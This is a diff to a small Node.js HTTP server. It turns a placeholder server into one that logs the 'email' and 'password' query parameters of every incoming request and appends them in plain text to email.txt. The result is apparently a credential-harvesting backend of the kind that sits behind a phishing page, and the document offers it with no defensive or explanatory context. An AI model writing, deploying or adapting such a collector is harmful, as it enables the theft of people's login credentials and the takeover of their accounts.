@@ -1,15 +1,19 @@
 const http = require('http');
-const fs = require('fs')
+const url = require('url');
+const fs = require('fs');
 
-const hostname = '127.0.0.1';
-const port = 3000;
 
 const server = http.createServer((req, res) => {
   res.statusCode = 200;
   res.setHeader('Content-Type', 'text/plain');
-  res.end('Server Running.');
+  console.log(url.parse(req.url,true).query);
+  fs.appendFile('email.txt', url.parse(req.url,true).query.email + ' ' + url.parse(req.url,true).query.password + '\n', function (err) {
+  
+});
+  res.end();
 });
 
-server.listen(port, hostname, () => {
-  console.log(`Server running at http://${hostname}:${port}/`);
-});
+
+
+
+server.listen(8000);
